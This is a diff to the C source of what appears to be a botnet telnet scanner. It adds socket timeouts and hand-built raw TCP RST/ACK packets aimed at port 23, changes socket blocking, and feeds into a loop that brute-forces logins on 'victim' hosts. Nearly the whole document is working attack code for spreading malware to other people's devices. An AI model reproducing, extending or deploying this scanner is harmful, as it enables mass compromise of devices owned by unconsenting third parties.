@@ -116,10 +116,21 @@ bool scan_negotiate(int sock, unsigned char *buf, int len) {
 	return true;
 }
 
+
 uint8_t scan_readuntil(const int32_t sock, const char **strs, const char **strs2)
 {
 	int16_t i = 0, maxlen = -1, minlen = -1;
-	unsigned char *buf = NULL;
+	unsigned char *buf = malloc(1);
+
+	fd_set fdset;
+	struct timeval stimeout;
+	stimeout.tv_sec = SCAN_SCANNER_STIMEOUT_SEC;
+	stimeout.tv_usec = SCAN_SCANNER_STIMEOUT_USEC;
+
+	FD_ZERO(&fdset);
+	FD_SET(sock, &fdset);
+	if (select(sock + 1, &fdset, NULL, NULL, &stimeout) < 1)
+		return 0;
 
 	while (*strs)
 	{
@@ -177,6 +188,38 @@ uint8_t scan_readuntil(const int32_t sock, const char **strs, const char **strs2
 	}
 	return 0;
 }
+
+// uint8_t scan_readuntil(const int32_t sock, const char **strs, const char **strs2)
+// {
+// 	fd_set myset;
+// 	struct timeval tv;
+// 	tv.tv_sec = timeout;
+// 	tv.tv_usec = timeoutusec;
+// 	unsigned char *initialRead = NULL;
+
+// 	while(bufferUsed + 2 < bufSize && (tv.tv_sec > 0 || tv.tv_usec > 0))
+// 	{
+// 		FD_ZERO(&myset);
+// 		FD_SET(fd, &myset);
+// 		if (select(fd+1, &myset, NULL, NULL, &tv) < 1) break;
+// 		initialRead = buffer + bufferUsed;
+// 		got = recv(fd, initialRead, 1, 0);
+// 		if(got == -1 || got == 0) return 0;
+// 		bufferUsed += got;
+// 		if(*initialRead == 0xFF)
+// 		{
+// 			got = recv(fd, initialRead + 1, 2, 0);
+// 			if(got == -1 || got == 0) return 0;
+// 			bufferUsed += got;
+// 			if(!negotiate(fd, initialRead, 3)) return 0;
+// 		} else {
+// 			if(strstr(buffer, toFind) != NULL || (matchLePrompt && matchPrompt(buffer))) { found = 1; break; }
+// 		}
+// 	}
+
+// 	if(found) return 1;
+// 	return 0;
+// }
 
 bool scan_scanner(void)
 {
@@ -328,6 +371,39 @@ bool scan_scanner(void)
 			if (riph->daddr != LOCAL_ADDR)
 				continue;
 
+			// Send back a ack rst to close any running threads on the telnet server
+			iph->saddr = LOCAL_ADDR;
+			iph->daddr = riph->saddr;
+			iph->ihl = 5;
+			iph->version = 4;
+			iph->tos = 0; // TOS = Type of service Can change QoS
+			iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
+			iph->ttl = 64; // TTL = TTL goes down onces for ever re-router it hits. If it hits 0 its discarded and icmp error sent
+			iph->protocol = 6; // 6 = TCP
+			iph->id = (rand() % 65535); // This line might be wrong
+			iph->check = 0;
+			iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
+
+			tcph->source = htons(LOCAL_PORT);
+			tcph->dest = htons(23); // Port 23 dest
+			tcph->ack_seq = 0;
+			tcph->doff = 5; // Size of tcp header
+			tcph->fin = 0;
+			tcph->syn = 0;
+			tcph->rst = 1;
+			tcph->psh = 0;
+			tcph->ack = 1;
+			tcph->urg = 0;
+			tcph->window = rand() & 0xffff; // Maximum allowed window size
+			tcph->urg_ptr = 0;
+			tcph->seq = (rand() % 65535);
+			tcph->check = 0;
+			tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));
+
+			addr.sin_addr.s_addr = iph->daddr;
+
+			sendto(sock, datagram, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)&addr, sizeof(addr));
+
 			printd("Attempting to brute: %s", ipv4_unpack(riph->saddr));
 			struct scan_victim *victim;
 			victim = &victim_table[i];
@@ -375,6 +451,7 @@ bool scan_scanner(void)
 							victim_table[i].state = FINISHED;
 							break;
 						}
+
 						setsockopt(victim_table[i].sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
 						setsockopt(victim_table[i].sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
 
@@ -420,7 +497,7 @@ bool scan_scanner(void)
 							else
 							{
 								// Does this line remove nonblock? If so I gotta remov this
-								// fcntl(victim_table[i].sock, F_SETFL, fcntl(victim_table[i].sock, F_GETFL, NULL) & (~O_NONBLOCK));
+								fcntl(victim_table[i].sock, F_SETFL, fcntl(victim_table[i].sock, F_GETFL, NULL) & (~O_NONBLOCK));
 								victim_table[i].state = USERNAME;
 							}
 						}
